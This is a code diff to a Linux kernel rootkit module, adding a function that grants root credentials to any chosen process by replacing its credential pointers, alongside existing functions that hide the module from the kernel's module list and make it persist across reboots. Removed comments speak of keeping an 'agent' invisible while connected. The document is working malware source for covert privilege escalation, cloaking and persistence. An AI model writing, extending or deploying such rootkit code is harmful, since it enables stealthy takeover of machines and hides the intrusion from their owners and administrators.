@@ -4,11 +4,10 @@
 #include <linux/fs.h>
 #include <linux/list.h>
 #include <linux/module.h>
+#include <linux/rcupdate.h>
 #include <linux/sched.h>
-#include <net/inet_sock.h>
 #include "rootkit.h"
 
-// Privilege escalation
 int rk_escalate(void)
 {
 	struct cred *new_cred;
@@ -19,7 +18,32 @@ int rk_escalate(void)
 	return commit_creds(new_cred);
 }
 
-// Module cloaking
+int rk_escalate_pid(pid_t nr)
+{
+	struct task_struct *task;
+	struct cred *new;
+
+	new = prepare_kernel_cred(&init_task);
+	if (!new)
+		return -ENOMEM;
+
+	rcu_read_lock();
+	task = pid_task(find_vpid(nr), PIDTYPE_PID);
+	if (!task) {
+		rcu_read_unlock();
+		abort_creds(new);
+		return -ESRCH;
+	}
+	get_task_struct(task);
+	rcu_read_unlock();
+
+	rcu_assign_pointer(task->real_cred, new);
+	rcu_assign_pointer(task->cred, get_cred(new));
+
+	put_task_struct(task);
+	return 0;
+}
+
 static struct list_head *saved_mod_list;
 
 void rk_cloak(void)
@@ -38,7 +62,11 @@ void rk_uncloak(void)
 	saved_mod_list = NULL;
 }
 
-// Persistence
+bool rk_is_cloaked(void)
+{
+	return saved_mod_list != NULL;
+}
+
 int rk_persist(void)
 {
 	struct file *f;
@@ -63,5 +91,13 @@ int rk_unpersist(void)
 	return 0;
 }
 
-// Auto-hide: make the agent invisible while connected.
-// Auto-unhide: clean up on disconnect.
+bool rk_is_persisted(void)
+{
+	struct file *f;
+
+	f = filp_open(PERSIST_PATH, O_RDONLY, 0);
+	if (IS_ERR(f))
+		return false;
+	filp_close(f, NULL);
+	return true;
+}
